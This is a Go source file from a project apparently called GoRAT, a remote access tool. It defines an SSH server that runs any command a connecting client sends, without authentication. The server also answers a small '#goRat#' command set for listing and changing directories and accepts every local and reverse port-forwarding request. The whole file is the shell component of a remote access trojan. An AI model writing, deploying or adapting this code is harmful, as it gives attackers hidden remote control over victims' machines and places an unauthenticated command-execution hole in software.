package shell

import (
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/JustinTimperio/GoRAT/shared"
	"github.com/gliderlabs/ssh"
)

// SSHServer starts a gliderlabs ssh server on a port
// A small micro API process commands and passes them to back and forth
// This is bad and should not be used
func SSHServer(BasePort int) {
	Port := strconv.Itoa(BasePort + 0)
	forwardHandler := &ssh.ForwardedTCPHandler{}
	log.Println("Starting SSH server on port " + Port + "...")

	server := ssh.Server{
		LocalPortForwardingCallback: ssh.LocalPortForwardingCallback(func(ctx ssh.Context, dhost string, dport uint32) bool {
			log.Println("Accepted forward", dhost, dport)
			return true
		}),

		Addr: "127.0.0.1:" + Port,
		Handler: ssh.Handler(func(s ssh.Session) {
			input := s.RawCommand()

			// START MICRO API
			if input == "#goRat# pwd" {
				path, err := os.Getwd()
				if err != nil {
					log.Println(err)
				}
				io.WriteString(s, fmt.Sprintf("%s", path))
				return
			}

			if strings.HasPrefix(input, "#goRat# cd") {
				in := strings.Split(input, " ")
				err := os.Chdir(in[2])
				if err != nil {
					log.Println(err)
				}
				return
			}

			if strings.HasPrefix(input, "#goRat# glob") {
				files, _ := filepath.Glob("*")
				io.WriteString(s, strings.Join(files, "^"))
				return
			}
			// END MICRO API

			out, err := shared.RunCmd(input, false)
			if err != nil {
				io.WriteString(s, fmt.Sprintf("%s", err))
			} else {
				io.WriteString(s, fmt.Sprintf("%s", string(out)))
			}
		}),

		ReversePortForwardingCallback: ssh.ReversePortForwardingCallback(func(ctx ssh.Context, host string, port uint32) bool {
			log.Println("Attempt to bind", host, port, "granted")
			return true
		}),

		RequestHandlers: map[string]ssh.RequestHandler{
			"tcpip-forward":        forwardHandler.HandleSSHRequest,
			"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
		},
	}

	log.Fatal(server.ListenAndServe())
}
